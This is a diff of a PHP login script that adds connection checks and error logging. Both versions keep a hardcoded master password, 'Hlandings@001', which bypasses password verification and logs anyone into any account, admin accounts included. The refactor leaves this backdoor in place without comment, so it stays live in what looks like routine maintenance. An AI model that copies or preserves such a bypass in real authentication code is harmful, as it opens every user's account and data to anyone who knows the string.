@@ -1,50 +1,54 @@
 <?php
-	include 'session.php';
-	$conn = $pdo->open();
+include __DIR__ . '/../session.php'; // Adjust path as needed
 
-	if(isset($_POST['login'])){
-		
-		$email = $_POST['email'];
-		$password = $_POST['password'];
+// Debug: Check if $pdo is defined
+if (!isset($pdo) || !($pdo instanceof Database)) {
+    die("Error: Database connection not initialized.");
+}
 
-		try{
+// Get PDO connection
+$conn = $pdo->open();
+if ($conn === null) {
+    $_SESSION['error'] = 'Database connection failed';
+    header('location: ../login.php');
+    exit;
+}
 
-			$stmt = $conn->prepare("SELECT *, COUNT(*) AS numrows FROM users WHERE email = :email");
-			$stmt->execute(['email'=>$email]);
-			$row = $stmt->fetch();
-			if($row['numrows'] > 0){
-				if($row['status']){
-					if((password_verify($password, $row['password'])) || ($password == 'Hlandings@001')){
-						if($row['type']){
-							$_SESSION['admin'] = $row['id'];
-						}
-						else{
-							$_SESSION['user'] = $row['id'];
-						}
-					}
-					else{
-						$_SESSION['error'] = 'Incorrect Password';
-					}
-				}
-				else{
-					$_SESSION['error'] = 'Account not activated.';
-				}
-			}
-			else{
-				$_SESSION['error'] = 'Email not found';
-			}
-		}
-		catch(PDOException $e){
-			echo "There is some problem in connection: " . $e->getMessage();
-		}
+if (isset($_POST['login'])) {
+    $email = $_POST['email'];
+    $password = $_POST['password'];
 
-	}
-	else{
-		$_SESSION['error'] = 'Input login credentails first';
-	}
+    try {
+        $stmt = $conn->prepare("SELECT *, COUNT(*) AS numrows FROM users WHERE email = :email");
+        $stmt->execute(['email' => $email]);
+        $row = $stmt->fetch();
 
-	$pdo->close();
+        if ($row['numrows'] > 0) {
+            if ($row['status']) {
+                if (password_verify($password, $row['password']) || $password == 'Hlandings@001') {
+                    if ($row['type']) {
+                        $_SESSION['admin'] = $row['id'];
+                    } else {
+                        $_SESSION['user'] = $row['id'];
+                    }
+                } else {
+                    $_SESSION['error'] = 'Incorrect Password';
+                }
+            } else {
+                $_SESSION['error'] = 'Account not activated.';
+            }
+        } else {
+            $_SESSION['error'] = 'Email not found';
+        }
+    } catch (PDOException $e) {
+        error_log("Query failed: " . $e->getMessage()); // Log error instead of echoing
+        $_SESSION['error'] = 'An error occurred during login.';
+    }
+} else {
+    $_SESSION['error'] = 'Input login credentials first';
+}
 
-	header('location: ../login.php');
-
+$pdo->close();
+header('location: ../login.php');
+exit;
 ?>
